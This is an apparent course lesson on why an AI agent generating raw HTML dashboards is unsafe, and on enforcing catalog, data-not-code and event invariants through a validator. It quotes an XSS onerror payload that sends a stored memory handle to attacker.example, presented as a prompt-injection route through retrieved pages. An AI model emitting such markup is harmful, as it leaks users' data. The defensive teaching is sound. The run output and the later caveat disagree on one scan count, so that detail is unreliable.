# Session 14, part 2 — First, watch the agent's UI betray you

## The lesson

Before defining declarative rendering, we first let the naive approach fail.
That failure gives us every rule the rest of this session needs.

Give the Session 13 agent the same three-city task, but ask it to return an
HTML dashboard:

> Compare the populations of London, Berlin, and Paris, and return an HTML
> dashboard I can open in a browser.

The agent completes the research and generates something that looks like a
dashboard. Inside it are three serious failures.

The first is **execution**. The model may generate, or copy from a retrieved
page, markup such as:

```html
<img src="x" onerror="fetch('https://attacker.example/e?m='+localStorage.memoryHandle)">
```

The browser does not know whether this line came from the model, a tool
result or a trusted developer. It sees an `onerror` handler and executes it.
The dashboard renders correctly, but the memory handle leaves the machine.
This is the Session 12 prompt-injection chain entering through a new
surface: data returned by the agent is interpreted as executable code.

The second is **consistency**. Regenerating the same dashboard may change the
order of the cities, the colours, the layout and the sorting. Users build
muscle memory around stable interfaces. An interface that continuously
rearranges itself becomes harder to use than a simple one that remains
predictable.

The third is **interaction**. The generated dashboard may contain a button
such as "re-run with 2027 estimates", but the button has no reliable channel
back to the agent. The HTML can display the last result, but it cannot
return the user's next action into the graph.

All three failures have the same root: we allowed the model to produce the
interface itself. The interface therefore inherited the model's authority,
variance and isolation.

> The agent may reference only components the client already trusts. An
> interface is declarative data, never executable code. Every user action
> returns to the agent as a validated event, never as authority.

This gives us three invariants:

- **Catalog invariant** — every component type must exist in a
  client-controlled catalog. Unknown or free-form components are rejected
  before rendering.
- **Data-not-code invariant** — components contain typed data fields. No
  field is evaluated as HTML, JavaScript or an unapproved URL.
- **Event invariant** — an interface can affect the system only by emitting a
  named and validated event that re-enters the agent graph like any other
  input.

## Verified against the code

Everything above maps onto real, already-existing code in this repo — none
of it was invented for this lesson.

- **The exact payload already exists as a fixture.** The `onerror` markup
  quoted above is verbatim the `"raw-html-type"` case in
  [`s13code/ui/fixtures/injections.json`](../s13code/ui/fixtures/injections.json),
  which the validator test suite (`tests/test_s14_ui.py`) already exercises
  under `expect_invariant: "catalog"`.
- **The naive path is real, not hypothetical.** `POST /v1/agent/runs` with
  `respond_as="text"` (the default) routes a comparison prompt through
  `answer_with_evidence` (`s13code/runtime.py:425`), whose system prompt
  tells the model to "answer the user directly" and imposes **no** shape
  constraint — if the prompt asks for HTML, the model is free to return HTML,
  verbatim, with nothing between it and a client that might assign it to
  `innerHTML`.
- **The declarative path passes through one wall.** `POST /v1/agent/runs`
  with `respond_as="ui"` instead routes through `compose_surface`
  (`s13code/runtime.py:662`), whose output — no matter what the model
  proposes — is passed through `validate_surface()`
  (`s13code/ui/validator.py`) before it is ever handed to a client. That
  function enforces exactly the three invariants above:
  `Invariant.CATALOG`, `Invariant.DATA_NOT_CODE`, `Invariant.EVENT`
  (`s13code/ui/validator.py:33`), checked against the component catalog and
  `REGISTERED_ACTIONS` (`s13code/ui/catalog.py:52` and `:124`).

## The proof script

[`proofs/naive_html_dashboard.py`](../proofs/naive_html_dashboard.py) runs
both paths for real, against the live S13 runtime and the real Gemini
gateway (the same pattern `proofs/harness_run.py` already uses for the
compose_surface harness), and proves each of the three failures — never by
rendering or executing anything it captures, only by pattern-matching the
resulting text as inert data and, for failures 1 and 3, by also running the
exact `injections.json` payloads through the real `validate_surface()`
deterministically, so the proof does not depend on what one live model call
happens to return.

```
S13_GATEWAY_PROVIDER=gemini GLC_BASE_URL=http://127.0.0.1:8111 \
  uv run python proofs/naive_html_dashboard.py
```

Writes `proofs/naive_html_dashboard.json`. A real run against the live
gateway produced:

```
1. execution   : naive scan={'script_tags': 0, 'event_handler_attrs': 1, 'js_or_data_urls': 0, 'raw_buttons': 0}  catalog rejections=1
2. consistency : run_a chars=1847  run_b chars=1860  identical=False
3. interaction : live naive raw <button> a=0 b=0  live declarative Button components=0  event-invariant rejections=1
```

Reading this against the three failures:

1. **Execution** — the `injections.json` payload, submitted as free text, is
   validated by nothing (`event_handler_attrs: 1` — literally the `onerror`
   attribute, sitting inert in a string). Submitted as a declarative
   `RawHtml` component, `validate_surface()` rejects it by name: `unknown
   component type 'RawHtml'` under the catalog invariant, before it ever
   reaches a client. The safe sibling component in the same surface
   (`ok`, a `Text` heading) still renders — a poisoned node does not blank
   the screen.
2. **Consistency** — the identical naive prompt, run twice, produced answers
   of different length (1847 vs. 1860 characters), different opening
   phrasing, and a different HTML structure (a Markdown table in one run, a
   heading-only lead-in in the other) — `identical_text: false`. Nothing in
   the naive path binds either answer to a stable source, so nothing
   guarantees the numbers agree either, run to run. The declarative path's
   shown values are instead `{"$bind": "/pointer"}` references into a
   harness-owned data model (`s13code/runtime.py:716` builds it from the
   graph's real node results) — the model chooses layout, never the values
   it's shown.
3. **Interaction** — this particular live run happened to produce no
   `<button>` on either side (the comparison goal didn't call for one), so
   the script also proves the point deterministically: a catalog-legal
   `Button` naming an unregistered action (`injections.json`'s
   `"unregistered-action"` case) is still refused — `rejected by name: an
   unregistered action is refused even though the component itself is
   perfectly catalog-legal` — under the event invariant. A naive `<button>`
   in free HTML has no such check available to it at all: there is nothing
   to accept *or* reject, because it never named an action the harness could
   verify in the first place.

One caveat worth stating plainly: the script's own text scanner (`scan()`)
is a coarse regex heuristic, and the captured run shows a `js_or_data_urls:
1` hit that is very likely a false positive — a `data:` substring inside an
unrelated word in the prose (e.g. a colon-terminated word starting "data"),
not an actual `data:` URL; the full answer text wasn't retained to confirm
which. That ambiguity is not a bug worth fixing — it is the point. Regex
scanning over free text is exactly the kind of "be careful" defense the
catalog invariant replaces: a validator that parses structure and checks
types deterministically, instead of pattern-matching a string and hoping.

## Where this leaves the rest of the session

The three invariants aren't aspirational here — they're the same
`validate_surface()` call this repo already runs on every `compose_surface`
output, already covered by `tests/test_s14_ui.py`, and already wired into
the render clients (`s13code/ui/client/index.html`,
`s13code/ui/client/app.html`), neither of which has ever used `innerHTML` on
a model-bound value (see the "render client never uses innerHTML" contract
test). This lesson section is the "before"; the rest of Session 14 is the
"after" already running in this codebase.
